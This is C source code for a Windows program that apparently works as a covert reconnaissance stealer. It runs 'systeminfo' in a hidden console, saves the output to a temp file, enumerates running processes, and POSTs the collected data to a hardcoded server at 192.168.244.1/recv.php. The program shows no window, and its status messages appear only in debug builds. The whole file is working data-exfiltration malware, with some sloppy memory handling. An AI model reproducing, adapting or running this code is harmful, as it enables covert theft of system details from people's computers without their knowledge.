#include <windows.h>
#include <winsock.h>
#include <TlHelp32.h>
#include <stdio.h>

#pragma warning (disable: 4996)
#pragma comment(lib, "ws2_32.lib")
char* get_proc_list();

char* data_accumulation();
BOOL send_data(char*);
BOOL write_sys_info();
char* get_data();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char* result = data_accumulation();

	if (send_data(result))
	{
#ifdef _DEBUG
		MessageBox(NULL, "Send - OK", "Info", MB_ICONINFORMATION);
#endif
	}
	else
	{
#ifdef _DEBUG
		MessageBox(NULL, "Unable send data", "Error", MB_ICONERROR);
#endif
	}
	return 0;
}

char* get_proc_list()
{
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	char* procList = (char*)malloc(sizeof(char*) * 2000);
	ZeroMemory(procList, _msize(procList));

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);

	while (Process32Next(hProcSnap, &pe32))
	{
		if (strlen(pe32.szExeFile) + _msize(procList) > _msize(procList))
			procList = (char*)realloc(procList, _msize(procList) + 500);
		strcat(procList, pe32.szExeFile);
		strcat(procList, "\r\n");
	}

	CloseHandle(hProcSnap);

	return procList;
}

char* data_accumulation()
{
	char *sysinfo, *procList, *result;
	UINT sysInfoLen, procListLen;
	write_sys_info();
	sysinfo = get_data();
	sysInfoLen = strlen(sysinfo);
	procList = get_proc_list();
	procListLen = strlen(procList);

	result = (char*)malloc(sizeof(char*) * (procListLen + sysInfoLen + 100));
	ZeroMemory(result, _msize(result));
	memcpy(result, sysinfo, sysInfoLen);
	memcpy(result + sysInfoLen, procList, procListLen);

	free(sysinfo);
	free(procList);

	return result;
}

BOOL send_data(char* data)
{
	SOCKET soc;
	WSADATA wsa;
	struct sockaddr_in sin;
	int lenData = strlen(data);
	char* postRequest;
	postRequest = (char*)malloc(sizeof(data) * (lenData + 500));
	ZeroMemory(postRequest, _msize(postRequest));
	ZeroMemory(&sin, sizeof(sin));

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
#ifdef _DEBUG
		MessageBox(NULL, "Failed initialization socket", "Error", MB_ICONERROR);
#endif
		return FALSE;
	}

	if ((soc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
	{
#ifdef _DEBUG
		MessageBox(NULL, "Failed creating socket", "Error", MB_ICONERROR);
#endif
		return FALSE;
	}

	sin.sin_addr.s_addr = inet_addr("192.168.244.1");
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);

	if (connect(soc, (SOCKADDR*)&sin, sizeof(sin)) < 0)
	{
#ifdef _DEBUG
		MessageBox(NULL, "Failed connecting socket", "Error", MB_ICONERROR);
#endif
		return FALSE;
	}

	sprintf(postRequest, "POST /recv.php HTTP/1.1\r\n"
	        "Host: 192.168.244.1\r\n"
	        "Content-Length: %d\r\n"
	        "Content-Type: application/x-www-form-urlencoded\r\n\r\ndata=%s", lenData + 5, data);

	if (send(soc, postRequest, strlen(postRequest), 0) < 0)
	{
#ifdef _DEBUG
		MessageBox(NULL, "Failed sending data", "Error", MB_ICONERROR);
#endif
		return FALSE;
	}
	shutdown(soc, 1);
	closesocket(soc);
	WSACleanup();

	return TRUE;
}

BOOL write_sys_info()
{
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	memset(&StartupInfo, 0, sizeof(StartupInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = SW_HIDE;

	if (!CreateProcess(NULL,
	                       "C:\\Windows\\System32\\cmd.exe /C \"chcp 65001 & systeminfo > %TEMP%\\data.txt\"",
	                       NULL,
	                       NULL,
	                       FALSE,
	                       CREATE_NO_WINDOW,
	                       NULL,
	                       NULL,
	                       &StartupInfo,
	                       &ProcessInfo)
	)
		return FALSE;
	return TRUE;
}

char* get_data()
{
	char tempPath[CHAR_MAX ] = {0};
	FILE* file;
	UINT size = 0;
	char* data;
	GetTempPath(CHAR_MAX, tempPath);

	strcat(tempPath, "\\data.txt");
	file = fopen(tempPath, "r");
	fseek(file, 0, SEEK_END);
	size = ftell(file);
	rewind(file);

	data = (char*)malloc(sizeof(char*) * size);
	ZeroMemory(data, _msize(data));
	fread(data, 1, size, file);
	fclose(file);
	return data;
}
